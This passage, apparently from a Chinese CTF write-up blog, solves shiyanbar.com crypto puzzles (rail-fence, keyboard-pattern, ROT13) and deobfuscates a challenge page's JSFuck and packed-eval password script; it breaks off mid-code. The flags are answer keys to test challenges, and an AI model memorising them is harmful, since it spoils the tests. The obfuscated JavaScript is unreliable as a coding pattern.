class="string">'ok'</span></span><br></pre></td></tr></table></figure><blockquote><p>aZZg/x\ZbavpZiEZp+n)o+<br>b[[h0y][cbwq[jF[q,o<em>p,<br>c\i1z^\dcxr\kG\r-p+q-<br>d]]j2{_]edys]lH]s.q,r.<br>e^^k3|<code>^fezt^mI^t/r-s/f__l4}a_gf{u_nJ_u0s.t0g`</code>m5~b<code>hg|v</code>oK`v1t/u1<br>haan6!caih}wapLaw2u0v2<br>ibbo7”dbji~xbqMbx3v1w3<br>jccp8#eckj!ycrNcy4w2x4<br>kddq9$fdlk”zdsOdz5x3y5<br>leer:%geml#{etPe{6y4z6<br>mffs;&amp;hfnm$|fuQf|7z5{7<br>nggt&lt;’igon%}gvRg}8{6|8<br>ohhu=(jhpo&amp;~hwSh~9|7}9<br>piiv&gt;)kiqp’!ixTi!:}8~:<br>qjjw?</em>ljrq(“jyUj”;~9!;<br>rkkx@+mksr)#kzVk#&lt;!:”&lt;<br>sllyA,nlts<em>$l{Wl$=”;#=<br>tmmzB-omut+%m|Xm%&gt;#&lt;$&gt;<br>unn{C.pnvu,&amp;n}Yn&amp;?$=%?<br>voo|D/qowv-‘o~Zo‘@%&gt;&amp;@<br>wpp}E0rpxw.(p![p(A&amp;?’A<br>xqq~F1sqyx/)q”\q)B‘@(B<br>yrr!G2trzy0</em>r#]r<em>C(A)C<br>zss”H3us{z1+s$^s+D)B</em>D<br>ok</p></blockquote><p>注意这一行：f__l4}a_gf{u_nJ_u0s.t0<br>栅栏密码特点就是隔几个字母能读顺成一个单词，一般译为分2个一组<br>具体情况具体分析，就像此题一处特殊单独三个一组。观察敏感得知，<br>反正有奇葩字符肯定不是，看有没有{，}，CTF,flag这种字符得知：<br>f__l4}a_gf{u_nJ_u0s.t0进行解密：</p><blockquote><p>f__    =&gt;f _  _<br>l4}     =&gt;l 4   }<br>a_     =&gt;a _<br>gf      =&gt;g f<br>{u      =&gt;{ u<br><em>n     =&gt;</em> n<br>J_     =&gt;J _<br>u0     =&gt;u 0<br>s.      =&gt;s .<br>t0      =&gt;t 0</p></blockquote><p>结果就是flag{_Just_4_fun_0.0_}</p><h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3><p> 题目：提示：和键盘有关<br>解题链接： <a href="http://ctf5.shiyanbar.com/360/keyboard.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/360/keyboard.html</a></p><h4 id="writeup：-1"><a href="#writeup：-1" class="headerlink" title="writeup："></a>writeup：</h4><p>打开网页后看到：BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN<br>根据题目提示，我发现这些在键盘上排列出一个英文字母..（这些明显是密室逃脱的套路）<br>BHUK,LP对应N，TGBNHGYT对应B，UYGBN对应C</p><p>flag:NBNCBNNBNBC</p><h3 id="密文-rot13"><a href="#密文-rot13" class="headerlink" title="密文 rot13"></a>密文 rot13</h3><p>57R9S980RNOS49973S757PQO9S80Q36P （md5不解密）<br>解密<a href="https://www.rot13.com" target="_blank" rel="noopener">网站</a><br>flag:57E9F980EABF49973F757CDB9F80D36C</p><h3 id="他的情书"><a href="#他的情书" class="headerlink" title="他的情书"></a>他的情书</h3><p> 从前从前,有个人爱你很久很久<br>格式：ctf{}<br>解题链接： <a href="http://ctf5.shiyanbar.com/crypto/4" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/crypto/4</a><br>f12查看源码</p><pre><code>`[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+[+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()`</code></pre><p>控制台解码提示<code>Hint:urlenode</code><br>再仔细查看源码发现</p><pre><code>var Words =&quot;%3Ccenter%3E%0A%0A%3Cp%3E%u4E0D%u96BE%u7684%uFF0C%u8F93%u5165%u5BC6%u7801%u8FA3%21%3C%2fp%3E%0A%0A%3Cscript%20language%3D%22JScript.Encode%22%3E%23@%7E%5EEwAAAA%3D%3DC%5E%2b.D%60rt%2b%5EVKE%23p@%23@%26EwUAAA%3D%3D%5E%23%7E@%0A%0A%3C%21--%0A%09%2f%2f%2a%2a%2a%28%u3065%uFFE3%203%uFFE3%29%u3065%u6211%u8981%u62B1%u62B1%21%21%21%2a%2a%2a%0Aeval%28function%28p%2Ca%2Cc%2Ck%2Ce%2Cd%29%7Be%3Dfunction%28c%29%7Breturn%28c%3Ca%3F%22%22%3Ae%28parseInt%28c%2fa%29%29%29%2b%28%28c%3Dc%25a%29%3E35%3FString.fromCharCode%28c%2b29%29%3Ac.toString%2836%29%29%7D%3Bif%28%21%27%27.replace%28%2f%5E%2f%2CString%29%29%7Bwhile%28c--%29d%5Be%28c%29%5D%3Dk%5Bc%5D%7C%7Ce%28c%29%3Bk%3D%5Bfunction%28e%29%7Breturn%20d%5Be%5D%7D%5D%3Be%3Dfunction%28%29%7Breturn%27%5C%5Cw%2b%27%7D%3Bc%3D1%3B%7D%3Bwhile%28c--%29if%28k%5Bc%5D%29p%3Dp.replace%28new%20RegExp%28%27%5C%5Cb%27%2be%28c%29%2b%27%5C%5Cb%27%2C%27g%27%29%2Ck%5Bc%5D%29%3Breturn%20p%3B%7D%28%27%3C%21--v%20p%28%29%7B6%208%3Dh.o.e.n%3B6%202%3D%22q%3D%3D%22%3B6%20a%3D%5C%27t.s%3Fe%3D%5C%27%3B6%20d%3Dj.r%3B6%20k%3D%5C%27%5C%27%3B6%20g%3D2.9%28m%2C4%2a4%29%2b2.9%28l%2C5%2a5%29%2b2.9%280%2C1%29%2b2.b%287%2C1%29%2b2.b%28z%2C1%29%2b2.b%28B%2C1%29%2b2.9%283%2b3%2C7%29%3B8%3Dd.b%28d.f%28%5C%27%3F%5C%27%29%2b1%29%3Ba%3Da.9%280%2Ca.f%28%5C%27%3F%5C%27%29%2b1%29%2b%5C%27A%3D%5C%27%3Bw%28i%3D0%3Bi%3C8.y%3Bi%2b%2b%29%7Bx%288.c%28i%29%3D%3Dg.c%28i%29%29%7Bh.u%288.c%28i%29%29%7D%7Dj%3Da%2b8%7D--%3E%27%2C38%2C38%2C%27%7C%7Ccry%7C%7C%7C%7Cvar%7C%7Cpass%7Csubstring%7Caddr%7Csubstr%7CcharAt%7Clocatie%7Cpasswd%7CindexOf%7Cpass2%7Cdocument%7C%7Clocation%7Cout%7C24%7C15%7Cvalue%7Cform%7Czhegejiamiyidiandoubuku%7CRm9yM0re354v5E4FUg5FasDboooo%7Chref%7Cphp%7Csoroki%7Cwrite%7Cfunction%7Cfor%7Cif%7CLen%7C11%7Cl0vau%7C13%27.split%28%27%7C%27%29%2C0%2C%7B%7D%29%29%0A--%3E%0A%3C%2fscript%3E%0A%0A%3Cform%20name%3D%22form%22%3E%0APassword%3A%20%3Cinput%20type%3D%22password%22%20name%3D%22passwd%22%3E%20%3Cinput%20type%3D%22button%22%20value%3D%22boom%21%21%21%21%22%20onClick%3D%22zhegejiamiyidiandoubuku%28%29%22%3E%0A%3C%2fform%3E%0A%0A%3C%2fcenter%3E&quot;;</code></pre><p>urldecode得到<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>不难的，输入密码辣!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript.Encode"</span>&gt;</span><span class="undefined">#@~^EwAAAA==C^+.D`rt+^VKE#p@#@&amp;EwUAAA==^#~@</span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="undefined">    //***(づ￣ 3￣)づ我要抱抱!!!***</span></span><br><span class="line"><span class="xml">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c<span class="tag">&lt;<span class="name">a?"":e(parseInt(c</span>/<span class="attr">a</span>)))+((<span class="attr">c</span>=<span class="string">c%a)</span>&gt;</span>35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\w+'&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;&#125;('<span class="comment">&lt;!--v p()&#123;6 8=h.o.e.n;6 2="q==";6 a=\'t.s?e=\';6 d=j.r;6 k=\'\';6 